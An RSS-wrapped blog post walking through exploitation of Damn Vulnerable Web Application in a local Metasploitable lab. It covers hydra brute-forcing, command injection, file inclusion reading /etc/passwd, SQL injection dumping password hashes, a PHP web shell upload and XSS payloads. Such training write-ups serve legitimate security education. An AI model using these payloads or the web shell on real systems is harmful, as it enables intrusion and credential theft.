<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Dvwa on </title>
    <link>http://mislusnys.github.io/tags/dvwa/</link>
    <description>Recent content in Dvwa on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 02 Feb 2015 08:40:17 +0000</lastBuildDate>
    <atom:link href="http://mislusnys.github.io/tags/dvwa/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Exploring Damn Vulnerable Web Application</title>
      <link>http://mislusnys.github.io/2015/02/02/damn-vulnerable-web-application/</link>
      <pubDate>Mon, 02 Feb 2015 08:40:17 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/2015/02/02/damn-vulnerable-web-application/</guid>
      <description>

&lt;h2 id=&#34;intro:a278ed06f786dfe478032a0f72deba1a&#34;&gt;Intro&lt;/h2&gt;

&lt;p&gt;Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.&lt;/p&gt;

&lt;p&gt;In this report we will be exploiting the vulnerabilities that are present in the DVWA (version 1.0.7).
We will use the version that is bundled in the &lt;a href=&#34;http://sourceforge.net/projects/metasploitable/files/Metasploitable2/&#34;&gt;Metasploitable 2&lt;/a&gt; VM.
We will use the lowest security setting (&lt;em&gt;PHPIDS:disabled&lt;/em&gt; and &lt;em&gt;Security Level:low&lt;/em&gt;).&lt;/p&gt;

&lt;h2 id=&#34;1-brute-force:a278ed06f786dfe478032a0f72deba1a&#34;&gt;1. Brute Force&lt;/h2&gt;

&lt;p&gt;Our first task is to brute force HTTP based login form:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/bf.png&#34; alt=&#34;Brute Force&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;burp&lt;/code&gt; we find that parameters are transmitted via URL:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&amp;amp;password=test&amp;amp;Login=Login#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And our session data:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Using this information we can use &lt;code&gt;hydra&lt;/code&gt; to brute force the login form:&lt;/p&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Hydra bruteforce&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8
9&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form &amp;quot;/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&amp;quot;
Hydra v7.6 (c)2013 by van Hauser/THC &amp;amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2015-02-02 09:13:54
[DATA] 16 tasks, 1 server, 28 login tries (l:4/p:7), ~1 try per task
[DATA] attacking service http-get-form on port 80
[80][www-form] host: 192.168.52.129   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-02-02 09:13:57
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;We found valid login credentials: &lt;code&gt;admin:password&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;2-command-execution:a278ed06f786dfe478032a0f72deba1a&#34;&gt;2. Command Execution&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/ce.png&#34; alt=&#34;Command Execution&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This part of the app gives the current user the ability to ping a host.
However it uses a vulnerable piece of code:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;$cmd = shell_exec( &#39;ping  -c 3 &#39; . $target );&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Since we control the &lt;code&gt;$target&lt;/code&gt; variable, we can use &lt;code&gt;;&lt;/code&gt; or &lt;code&gt;||&lt;/code&gt; to stack commands.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;127.0.0.1;ls -al&lt;/code&gt; as input we get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.089 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.000/0.044/0.089/0.036 ms
total 20
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;3-cross-site-request-forgery:a278ed06f786dfe478032a0f72deba1a&#34;&gt;3. Cross Site Request Forgery&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/csrf.png&#34; alt=&#34;CSRF&#34; /&gt;&lt;/p&gt;

&lt;p&gt;CSRF is an attack in which an authenticated user (usually administrator) unknowingly executes a certain action.
In our case the password change operation results in the following request:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=test&amp;amp;password_conf=test&amp;amp;Change=Change#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If we can trick an authenticated user to make this request, we can change this user&amp;rsquo;s password. Usually this is done by tricking the user into visiting a page controlled by the attacker with malicious request embedded inside &lt;code&gt;img&lt;/code&gt;, &lt;code&gt;iframe&lt;/code&gt; tags or inside malicious javascript code.&lt;/p&gt;

&lt;h2 id=&#34;4-file-inclusion:a278ed06f786dfe478032a0f72deba1a&#34;&gt;4. File Inclusion&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/fi.png&#34; alt=&#34;File Inclusion&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This one is pretty straight forward. We can change the &lt;code&gt;page&lt;/code&gt; variable to display sensitive information:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/fi/?page=/etc/passwd&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/bin/sh 
man:x:6:12:man:/var/cache/man:/bin/sh 
lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
mail:x:8:8:mail:/var/mail:/bin/sh 
news:x:9:9:news:/var/spool/news:/bin/sh 
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
proxy:x:13:13:proxy:/bin:/bin/sh 
www-data:x:33:33:www-data:/var/www:/bin/sh 
backup:x:34:34:backup:/var/backups:/bin/sh 
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
dhcp:x:101:102::/nonexistent:/bin/false 
syslog:x:102:103::/home/syslog:/bin/false 
klog:x:103:104::/home/klog:/bin/false 
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
bind:x:105:113::/var/cache/bind:/bin/false 
postfix:x:106:115::/var/spool/postfix:/bin/false 
ftp:x:107:65534::/home/ftp:/bin/false 
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false 
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false 
distccd:x:111:65534::/:/bin/false 
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash 
service:x:1002:1002:,,,:/home/service:/bin/bash 
telnetd:x:112:120::/nonexistent:/bin/false 
proftpd:x:113:65534::/var/run/proftpd:/bin/false 
statd:x:114:65534::/var/lib/nfs:/bin/false 
snmp:x:115:65534::/var/lib/snmp:/bin/false 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;5-1-sql-injection:a278ed06f786dfe478032a0f72deba1a&#34;&gt;5.1 SQL Injection&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/sqli.png&#34; alt=&#34;SQLI&#34; /&gt;&lt;/p&gt;

&lt;p&gt;User input is unfiltered and used in the following query:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If we enter &lt;code&gt;&#39; or 1=1-- -&lt;/code&gt; as an id then the query becomes:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39; or 1=1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;which makes WHERE clause always true and shows us all the records:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39;or 1=1-- -
First name: admin
Surname: admin

ID: &#39;or 1=1-- -
First name: Gordon
Surname: Brown

ID: &#39;or 1=1-- -
First name: Hack
Surname: Me

ID: &#39;or 1=1-- -
First name: Pablo
Surname: Picasso

ID: &#39;or 1=1-- -
First name: Bob
Surname: Smith
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using &lt;code&gt;UNION&lt;/code&gt; keyword we can extract any information available to the app&amp;rsquo;s user from the database.
&lt;code&gt;&#39; union select database(),null -- -&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39; union select database(),null -- -
First name: dvwa
Surname: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;&#39; union select table_name,null from information_schema.tables where table_schema=&#39;dvwa&#39;-- -&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID:  &#39; union select table_name,null from information_schema.tables where table_schema=&#39;dvwa&#39;-- -
First name: guestbook
Surname: 

ID:  &#39; union select table_name,null from information_schema.tables where table_schema=&#39;dvwa&#39;-- -
First name: users
Surname: 

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;&#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: user_id
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: first_name
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: last_name
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: user
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: password
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: avatar
Surname: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;&#39; union select user, password from users-- -&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39; union select user, password from users-- -
First name: admin
Surname: 098f6bcd4621d373cade4e832627b4f6

ID: &#39; union select user, password from users-- -
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: &#39; union select user, password from users-- -
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: &#39; union select user, password from users-- -
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: &#39; union select user, password from users-- -
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks like the passwords are MD5 hashed. However, they are easily found to be &lt;code&gt;test&lt;/code&gt;, &lt;code&gt;abc123&lt;/code&gt;, &lt;code&gt;charley&lt;/code&gt;, &lt;code&gt;letmein&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; respectively.&lt;/p&gt;

&lt;h2 id=&#34;5-2-sql-injection-blind:a278ed06f786dfe478032a0f72deba1a&#34;&gt;5.2 SQL Injection(Blind)&lt;/h2&gt;

&lt;p&gt;The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
We can use &lt;code&gt;sqlmap&lt;/code&gt; to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)&lt;/p&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;SQLMap Table Dump&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;sqlmap -u &amp;quot;http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&amp;amp;Submit=Submit#&amp;quot; --cookie=&amp;quot;security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&amp;quot; --dump

Database: dvwa
Table: users
[5 entries]
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| user_id | user    | avatar                                                | password                         | last_name | first_name |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| 1       | admin   | http://192.168.52.129/dvwa/hackable/users/admin.jpg   | 098f6bcd4621d373cade4e832627b4f6 | admin     | admin      |
| 2       | gordonb | http://192.168.52.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
| 3       | 1337    | http://192.168.52.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
| 4       | pablo   | http://192.168.52.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
| 5       | smithy  | http://192.168.52.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;h2 id=&#34;6-file-upload:a278ed06f786dfe478032a0f72deba1a&#34;&gt;6. File Upload&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/up.png&#34; alt=&#34;File Upload&#34; /&gt;&lt;/p&gt;

&lt;p&gt;On the low security setting there are no restrictions on file upload. We can upload a php file containing simple code:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;PHP Shell&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(isset($_REQUEST[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;])){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;$cmd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;($_REQUEST[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;system($cmd);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;lt;/pre&amp;gt;$cmd&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;die&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;../../hackable/uploads/shell.php succesfully uploaded!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can execute commands now via this shell:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/hackable/uploads/shell.php?cmd=ls -al&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;7-1-reflected-xss:a278ed06f786dfe478032a0f72deba1a&#34;&gt;7.1 Reflected XSS&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/xss.png&#34; alt=&#34;XSS&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here whatever we enter gets included into page source.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/cookie.png&#34; alt=&#34;Cookie&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;7-2-stored-xss:a278ed06f786dfe478032a0f72deba1a&#34;&gt;7.2 Stored XSS&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/xss2.png&#34; alt=&#34;XSS&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here the app is vulnerable to XSS again. However, this time the injected code is stored inside the database and is executed every time somebody visits the guestbook page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/stored.png&#34; alt=&#34;Stored XSS&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;summary:a278ed06f786dfe478032a0f72deba1a&#34;&gt;Summary&lt;/h2&gt;

&lt;p&gt;DVWA includes most common web server vulnerabilities and provides easy access to the vulnerable pieces of code. It is a great package for a beginner level pentest demo.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>